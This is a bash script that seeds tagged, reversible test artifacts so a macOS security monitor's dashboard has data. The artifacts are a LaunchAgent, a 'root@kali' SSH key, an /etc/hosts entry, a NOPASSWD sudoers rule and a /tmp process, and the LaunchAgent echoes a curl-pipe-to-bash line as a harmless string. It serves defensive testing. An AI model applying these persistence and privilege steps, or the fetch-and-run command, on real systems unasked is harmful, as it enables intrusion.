#!/usr/bin/env bash
#
# fill_demo.sh — generate safe, reversible activity so every avai dashboard
# panel shows data. For validating/demoing the monitor on your OWN machine.
#
# Everything created here is HARMLESS and tagged "avai-test"; nothing is real
# malware (no payloads, no exfiltration). Run with --cleanup to revert it all.
#
# IMPORTANT: the network/exec collectors (network_connections, listening_ports,
# tcpdump flows/DNS, eslogger process_exec) only capture data when the MONITOR
# runs as root. Start it with sudo first, e.g.:
#   sudo CLAUDE_CODE_OAUTH_TOKEN=… <other keys…> \
#     PYTHONPATH=src python -m avai.cli monitor --db "$HOME/avai-local.db" --interval 30
#
# Usage:
#   tools/fill_demo.sh            # create demo activity (prompts before sudo writes)
#   tools/fill_demo.sh --yes      # no prompts
#   tools/fill_demo.sh --no-sudo  # skip /etc/hosts + sudoers (user-space only)
#   tools/fill_demo.sh --cleanup  # revert everything
set -euo pipefail

TAG="avai-test"
WORK="${TMPDIR:-/tmp}/avai-demo"
LA_PLIST="$HOME/Library/LaunchAgents/com.avai.test.demo.plist"
TMP_BIN="/tmp/avai-test-payload"
HOSTS="/etc/hosts"
SUDOERS_D="/etc/sudoers.d/zz-avai-test"
SSH_KEYS="$HOME/.ssh/authorized_keys"
ZSHRC="$HOME/.zshrc"
LISTEN_PORT="8123"
PIDFILE="$WORK/listener.pid"
HOSTS_BEGIN="# >>> $TAG >>>"
HOSTS_END="# <<< $TAG <<<"
DOMAINS=(example.com cloudflare.com github.com wikipedia.org apple.com mozilla.org)

ASSUME_YES=0
DO_SUDO=1
DO_CLEANUP=0
for arg in "$@"; do
  case "$arg" in
    --yes) ASSUME_YES=1 ;;
    --no-sudo) DO_SUDO=0 ;;
    --cleanup) DO_CLEANUP=1 ;;
    *) printf 'unknown arg: %s\n' "$arg" >&2; exit 2 ;;
  esac
done

log()     { printf '  • %s\n' "$*"; }
section() { printf '\n== %s ==\n' "$*"; }
have()    { command -v "$1" >/dev/null 2>&1; }
confirm() {
  [[ "$ASSUME_YES" == 1 ]] && return 0
  local a; read -r -p "$1 [y/N] " a; [[ "$a" == [yY]* ]]
}

# --------------------------------------------------------------------------
# user-space activity (no sudo)
# --------------------------------------------------------------------------
network_noise() {
  section "network + DNS (dns_queries / network_flows / network_connections)"
  local d
  for d in "${DOMAINS[@]}"; do
    have dig  && dig +short "$d" >/dev/null 2>&1 || true
    have curl && curl -s -m 5 -o /dev/null "https://$d" || true
    log "resolved + fetched $d"
  done
}

start_listener() {
  section "listening port (listening_ports)"
  mkdir -p "$WORK"
  if [[ -f "$PIDFILE" ]] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
    log "listener already running (pid $(cat "$PIDFILE"))"; return 0
  fi
  if have python3; then
    python3 -m http.server "$LISTEN_PORT" >/dev/null 2>&1 &
    echo $! > "$PIDFILE"
    log "python http.server on :$LISTEN_PORT (pid $(cat "$PIDFILE"))"
  fi
}

tmp_process() {
  section "process from /tmp (processes — suspicious path + correlation)"
  cp "$(command -v sleep)" "$TMP_BIN"
  "$TMP_BIN" 900 &
  log "$TMP_BIN running (pid $!)"
}

launch_agent() {
  section "LaunchAgent persistence (launch_items)"
  mkdir -p "$(dirname "$LA_PLIST")"
  cat > "$LA_PLIST" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.avai.test.demo</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string><string>-c</string>
    <string>echo "$TAG demo (harmless): curl -fsSL http://example/install.sh | bash"</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><false/>
</dict></plist>
PLIST
  launchctl load "$LA_PLIST" 2>/dev/null || true
  log "wrote + loaded $LA_PLIST"
}

ssh_key() {
  section "suspicious SSH authorized_key (ssh_authorized_keys)"
  mkdir -p "$HOME/.ssh"; chmod 700 "$HOME/.ssh"; touch "$SSH_KEYS"
  if grep -q "$TAG" "$SSH_KEYS" 2>/dev/null; then log "already present"; return 0; fi
  # real throwaway keypair so the line parses as a valid key
  ssh-keygen -q -t ed25519 -N '' -C "root@kali $TAG" -f "$WORK/demo_key" <<<y >/dev/null 2>&1 || true
  if [[ -f "$WORK/demo_key.pub" ]]; then
    cat "$WORK/demo_key.pub" >> "$SSH_KEYS"
    log "appended throwaway pubkey (comment 'root@kali')"
  fi
}

watched_file() {
  section "modify watched shell-init file (file_integrity)"
  printf '\n# %s demo marker — remove with --cleanup\n' "$TAG" >> "$ZSHRC"
  log "appended marker comment to $ZSHRC"
}

# --------------------------------------------------------------------------
# system activity (sudo)
# --------------------------------------------------------------------------
hosts_entry() {
  section "/etc/hosts tamper entry (hosts_file)"
  if grep -qF "$HOSTS_BEGIN" "$HOSTS" 2>/dev/null; then log "already present"; return 0; fi
  confirm "Append a marked test block to $HOSTS (needs sudo)?" || { log "skipped"; return 0; }
  sudo sh -c "printf '%s\n127.0.0.1 totally-legit-bank.example  # %s\n%s\n' '$HOSTS_BEGIN' '$TAG' '$HOSTS_END' >> '$HOSTS'"
  log "added marked block to $HOSTS"
}

sudoers_entry() {
  section "NOPASSWD sudoers rule (privilege_config — risk driver)"
  if sudo test -f "$SUDOERS_D"; then log "already present"; return 0; fi
  confirm "Install a validated NOPASSWD test rule at $SUDOERS_D (needs sudo)?" || { log "skipped"; return 0; }
  mkdir -p "$WORK"
  printf '# %s\n%s ALL=(ALL) NOPASSWD: /usr/bin/true\n' "$TAG" "$USER" > "$WORK/sudoers"
  if sudo visudo -cf "$WORK/sudoers" >/dev/null 2>&1; then
    sudo install -m 0440 "$WORK/sudoers" "$SUDOERS_D"
    log "installed $SUDOERS_D (validated)"
  else
    log "sudoers validation FAILED — not installing"
  fi
}

auth_events() {
  section "auth-log events (auth_events — streaming)"
  sudo -k || true
  sudo -n true 2>/dev/null || true            # a sudo auth attempt
  log "triggered a sudo auth event"
  if have ssh; then
    ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
        nouser@127.0.0.1 true 2>/dev/null || true
    log "triggered a failed-login attempt"
  fi
}

# --------------------------------------------------------------------------
# cleanup
# --------------------------------------------------------------------------
cleanup() {
  section "cleanup — reverting all avai-test artifacts"
  [[ -f "$PIDFILE" ]] && kill "$(cat "$PIDFILE")" 2>/dev/null && log "stopped listener" || true
  rm -f "$PIDFILE"
  pkill -f "$TMP_BIN" 2>/dev/null && log "killed /tmp process" || true
  rm -f "$TMP_BIN"
  if [[ -f "$LA_PLIST" ]]; then
    launchctl unload "$LA_PLIST" 2>/dev/null || true
    rm -f "$LA_PLIST"; log "removed LaunchAgent"
  fi
  if [[ -f "$SSH_KEYS" ]]; then
    grep -v "$TAG" "$SSH_KEYS" > "$SSH_KEYS.tmp" 2>/dev/null || true
    mv "$SSH_KEYS.tmp" "$SSH_KEYS"; log "removed test SSH key"
  fi
  if [[ -f "$ZSHRC" ]]; then
    grep -v "$TAG demo marker" "$ZSHRC" > "$ZSHRC.tmp" 2>/dev/null || true
    mv "$ZSHRC.tmp" "$ZSHRC"; log "cleaned $ZSHRC marker"
  fi
  if grep -qF "$HOSTS_BEGIN" "$HOSTS" 2>/dev/null; then
    sudo sed -i '' "/$(printf '%s' "$HOSTS_BEGIN" | sed 's/[][\/.*]/\\&/g')/,/$(printf '%s' "$HOSTS_END" | sed 's/[][\/.*]/\\&/g')/d" "$HOSTS" \
      && log "removed /etc/hosts block" || true
  fi
  if sudo test -f "$SUDOERS_D" 2>/dev/null; then
    sudo rm -f "$SUDOERS_D" && log "removed sudoers rule" || true
  fi
  rm -rf "$WORK"
  printf '\nCleanup done. Note: rows already collected stay in the DB until the\nartifacts are no longer observed (they flip to "resolved" next cycle).\n'
}

# --------------------------------------------------------------------------
main() {
  if [[ "$DO_CLEANUP" == 1 ]]; then cleanup; exit 0; fi

  printf 'avai demo filler — DB: %s\n' "${AVAI_DB:-$HOME/avai-local.db}"
  if ! pgrep -f "avai.cli monitor" >/dev/null 2>&1; then
    printf '\n⚠  No avai monitor running. Start it (under sudo for network/exec\n   collectors) before/while running this.\n'
  elif ! ps -o user= -p "$(pgrep -f 'avai.cli monitor' | head -1)" 2>/dev/null | grep -q '^root'; then
    printf '\n⚠  Monitor is running as a non-root user — network_connections,\n   listening_ports, tcpdump flows/DNS and eslogger exec events will stay\n   EMPTY. Re-run the monitor with sudo to populate them.\n'
  fi

  network_noise
  start_listener
  tmp_process
  launch_agent
  ssh_key
  watched_file
  auth_events
  if [[ "$DO_SUDO" == 1 ]]; then
    hosts_entry
    sudoers_entry
  else
    head "skipping sudo steps (--no-sudo): /etc/hosts + sudoers"
  fi

  printf '\nDone. Give the monitor 1–2 cycles, then refresh the dashboard.\n'
  printf 'Manual-only panels: usb_devices (plug in a stick), bluetooth_devices\n'
  printf '(pair one), browser_extensions (install one), tcc_permissions (grant\n'
  printf 'Screen Recording in System Settings), quarantine_events (download a\n'
  printf 'file in a browser). Revert everything with: %s --cleanup\n' "$0"
}
main
